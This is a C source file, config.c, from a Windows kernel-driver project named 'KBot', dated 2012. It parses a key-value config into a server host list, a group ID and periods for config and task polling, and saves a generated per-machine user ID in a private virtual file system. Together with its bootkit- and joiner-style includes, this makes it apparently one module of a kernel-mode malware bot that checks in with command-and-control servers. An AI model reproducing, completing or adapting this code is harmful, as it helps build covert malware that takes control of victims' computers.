//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KBot project.
//	
// module: config.c
// $Revision: 34 $
// $Date: 2012-08-23 15:11:38 +0400 (Чт, 23 авг 2012) $
// description: 
//	Config file processing engine.

#include <Ntifs.h>
#include <ntddk.h>
#include <ntimage.h>
#define NTSTRSAFE_NO_DEPRECATE
#include <ntstrsafe.h>

#include "version.h"
#include "ntddkex.h"
#include "kdbg.h"
#include "joiner.h"
#include "bklib.h"

#include "..\fslib\fslib.h"
#include "..\bkdrv\bkdrv.h"

#include "kbot.h"
#include "kbotinc.h"

#define	_TCHAR	CHAR


typedef	struct _REQUEST_PARAMETER
{
	ULONG	NameHash;
	ULONG	Flags;
	PCHAR	pValue;
} REQUEST_PARAMETER, *PREQUEST_PARAMETER;

typedef struct _REQUEST_PARAMETERS
{
	ULONG				Count;
	REQUEST_PARAMETER	Parameter[];
} REQUEST_PARAMETERS, *PREQUEST_PARAMETERS;



PKBOT_CONFIG volatile	g_KBotConfig = NULL;
KBOT_USER				g_KBotUserId = {0};
//
//	Allocates a memory buffer and duplicates the specified source string into it.
//
static	LPTSTR DupString(
	LPTSTR	SourceStr,
	ULONG	MinimumLength
	)
{
	LPTSTR	DestStr;
	ULONG	Size = max((strlen(SourceStr) + 1) * sizeof(_TCHAR), MinimumLength * sizeof(_TCHAR));
	if (DestStr = KBotAlloc(Size))
	{
		RtlZeroMemory(DestStr, Size);
		strcpy(DestStr, SourceStr);
	}
	
	return(DestStr);
}


//
//	Parses the specified buffer containg lines of parameter strings like:
//	 NAME = VALUE
//	Allocates and fills REQUEST_PARAMETERS structure with name hashes and parameter values.
//
NTSTATUS ParseParamFile(
	PCHAR	ParamStr,					// buffer containg lines of parameter strings
	PREQUEST_PARAMETERS* ppParameters,	// variable to return pointer to REQUEST_PARAMETERS structure
	BOOL	bCaseSensitive				// specifies how to parse parameter names and values: case sensitive or not
	)
{
	NTSTATUS ntStatus = STATUS_SUCCESS;
	PCHAR	pStr, cStr = ParamStr;
	ULONG	Count = 0;
	PREQUEST_PARAMETERS	pParams;

	// Calculating maximum number of parameters in the file
	while(cStr = strchr(cStr, '='))
	{
		Count += 1;
		cStr += 1;
	}

	if (Count)
	{
		// Allocating REQUEST_PARAMETER structure
		if (pParams = KBotAlloc(sizeof(REQUEST_PARAMETERS) + Count * sizeof(REQUEST_PARAMETER)))
		{
			PREQUEST_PARAMETER pParam = (PREQUEST_PARAMETER)&pParams->Parameter;
			pParams->Count = 0;

			do 
			{
				if ((pStr = strchr(ParamStr, '\r')) || (pStr = strchr(ParamStr, '\n')))
				{
					*pStr = 0;
					pStr += 1;
				}

				if (cStr = strchr(ParamStr, ';'))
					*cStr = 0;

				if (cStr = strchr(ParamStr, '='))
				{
					if (!bCaseSensitive)
					{
						ANSI_STRING As;
						// Converting to upper case
						RtlInitAnsiString(&As, ParamStr);
						RtlUpperString(&As, &As);
					}

					*cStr = 0;
					cStr += 1;

					strtrim(ParamStr, " \t\r\n");
					strtrim(cStr, " \t");

					if (*ParamStr)
					{
						pParam->NameHash = BkCRC32(ParamStr, strlen(ParamStr));
						pParam->pValue = cStr;
						pParams->Count += 1;
						pParam += 1;
					}
				}	// if (cStr = StrChr(ParamStr, '='))
			} while(ParamStr = pStr);

			*ppParameters = pParams;
			ASSERT(ntStatus == STATUS_SUCCESS);

		}	// if (pParams = hAlloc(sizeof(REQUEST_PARAMETERS) + Count * sizeof(REQUEST_PARAMETER)))
		else
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	}	// if (Count)
	else
		ntStatus = STATUS_INVALID_PARAMETER;

	return(ntStatus);
}


//
//	Scans the specified REQUEST_PARAMETERS structure for a parameter with the specified Name hash.
//	Returns pointer to the value of the parameter or NULL if the parameter not found.
//
PCHAR GetParamValue(
	ULONG NameHash,
	PREQUEST_PARAMETERS	pParameters
	)
{
	PCHAR	pValue = NULL;
	ULONG	i;

	if (pParameters)
	{
		for (i=0; i<pParameters->Count; i++)
		{
			if (pParameters->Parameter[i].NameHash == NameHash)
			{
				pValue = pParameters->Parameter[i].pValue;
				break;
			}
		}	// for (i=0; i<pParameters->Count; i++)
	}	// if (pParameters)

	return(pValue);
}

//
//	Parses the specified pHostList string into multiple strings devided by ','.
//	Allocates and fills a pHostArray array with pointers to those strings.
//
NTSTATUS BuildHostArray(
	PCHAR	pHostList,
	PCHAR**	pHostArray,
	PULONG	pNumberHosts
	)
{
	NTSTATUS ntStatus = STATUS_SUCCESS;
	PCHAR	cStr = pHostList;
	ULONG	Count = 1;
	PCHAR*	HostArray;

	// Calculating maximum number of hosts in the list
	while(cStr = strchr(cStr, ','))
	{
		Count += 1;
		cStr += 1;
	}

	if (HostArray = (PCHAR*)KBotAlloc(Count * sizeof(PCHAR)))
	{
		Count = 0;
		do
		{
			HostArray[Count] = pHostList;
			if (pHostList = strchr(pHostList, ','))
			{
				*pHostList = 0;
				pHostList += 1;
			}
			strtrim(HostArray[Count], " \t");
			Count += 1;
		} while(pHostList);

		*pHostArray = HostArray;
		*pNumberHosts = Count;

	}	// if (HostArray = KBotAlloc(Count * sizeof(PCHAR)))
	else
		ntStatus = STATUS_INSUFFICIENT_RESOURCES;

	return(ntStatus);
}


//
//	Releases the specified configuration structure.
//	Cleans up parameters, frees memory.
//
VOID KBotReleaseConfig(
	PKBOT_CONFIG Config
	)
{
	ASSERT_KBOT_CONFIG(Config);
	if (Config->HostArray)
		KBotFree(Config->HostArray);
	if (Config->pHostList)
		KBotFree(Config->pHostList);
	if (Config->pKey)
		KBotFree(Config->pKey);
#if DBG
	Config->Magic = 0;
#endif
	KBotFree(Config);
}


//
//	Initializes KBOT global configuration structure with the specified parameters.
//
static NTSTATUS	KBotInitConfig(
	PREQUEST_PARAMETERS	pIniParams,
	ULONG	ConfigCRC				// CRC32 hash of the config file
	)
{
	NTSTATUS		ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	PKBOT_CONFIG	Config;
	PCHAR			pHostList, pValue;
	ULONG			uValue;

	do	// not a loop
	{
		// Creating new configuration structure
		if (!(Config = MyAllocatePool(PagedPool, sizeof(KBOT_CONFIG))))
		{
			ASSERT(ntStatus == STATUS_INSUFFICIENT_RESOURCES);
			break;
		}
		RtlZeroMemory(Config, sizeof(KBOT_CONFIG));

#if DBG
		Config->Magic = KBOT_CONFIG_MAGIC;
#endif
		Config->ConfigCRC = ConfigCRC;
			
		//	active host list
		if ((pValue = GetParamValue(CRC_HOSTS, pIniParams)) && *(strtrim(pValue, " \t")) != 0 && (pValue = DupString(pValue, 0)))
			Config->pHostList = pValue;
		else
			pValue = DupString(KBOT_DEFAULT_HOST_LIST, 0);

		if (!(NT_SUCCESS(ntStatus = BuildHostArray(pValue, &Config->HostArray, &Config->HostCount))))
			break;
		Config->HostIndex = 0;

		//	group ID
		if ((pValue = GetParamValue(CRC_GROUP, pIniParams)) && (uValue = strtol(pValue, NULL, 0)))
			Config->GroupId = uValue;
		else
			Config->GroupId = KBOT_DEFAULT_GROUP_ID;

		//	config update period
		if ((pValue = GetParamValue(CRC_CONFIG_PERIOD, pIniParams)) && (uValue = strtol(pValue, NULL, 0)))
			Config->ConfigPeriod = uValue;
		else
			Config->ConfigPeriod = KBOT_DEFAULT_CONFIG_PERIOD;
		
		//	task update period
		if ((pValue = GetParamValue(CRC_TASK_PERIOD, pIniParams)) && (uValue = strtol(pValue, NULL, 0)))
			Config->TaskPeriod = uValue;
		else
			Config->TaskPeriod = KBOT_DEFAULT_TASK_PERIOD;

		Config->MinimumPeriod = KBOT_MINIMUM_REQUEST_PERIOD;

		KdPrint(("KBOT: global configuration data initialized\n"));

		ntStatus = STATUS_SUCCESS;
	} while(FALSE);

	if (NT_SUCCESS(ntStatus))
	{
		if (Config = InterlockedExchangePointer(&g_KBotConfig, Config))
			KBotReleaseConfig(Config);
	}
	else
	{
		if (Config)
			KBotReleaseConfig(Config);
	}

	return(ntStatus);
}


//
//	Tries to loads KBOT configuration file from the VFS root directory and from the current driver module.
//	Initializes global configuration structure.
//
NTSTATUS KBotLoadConfig(VOID)
{
	NTSTATUS		ntStatus;

	ntStatus = KBotInitConfig(NULL, 0);

	return(ntStatus);
}


VOID KBotGetUserId(VOID)
{
	PCHAR	pUserIdFile;
	ULONG	UserIdSize;

	ANSI_STRING		aUserIdName = RTL_CONSTANT_STRING(szKBotUserIdFileName);

	// Looking for the user ID file stored within the VFS root directory
	if (NT_SUCCESS(FsLoadFile(&aUserIdName, (PCHAR*)&pUserIdFile, &UserIdSize)) && UserIdSize == sizeof(KBOT_USER))
	{
		// User ID file found and loaded
		memcpy(&g_KBotUserId, pUserIdFile, UserIdSize);
		MyFreePool(pUserIdFile);
		KdPrint(("KBOT: user ID loaded from a file\n"));
	}
	else
	{
		// No user ID file found
		LARGE_INTEGER	Ticks;
		KeQueryTickCount(&Ticks);

		BkGuidFromSeed(&g_KBotUserId.Id, &Ticks.LowPart);
		FsSaveFile(&aUserIdName, (PCHAR)&g_KBotUserId.Id, sizeof(KBOT_USER));

		KdPrint(("KBOT: new user ID created\n"));
	}
}
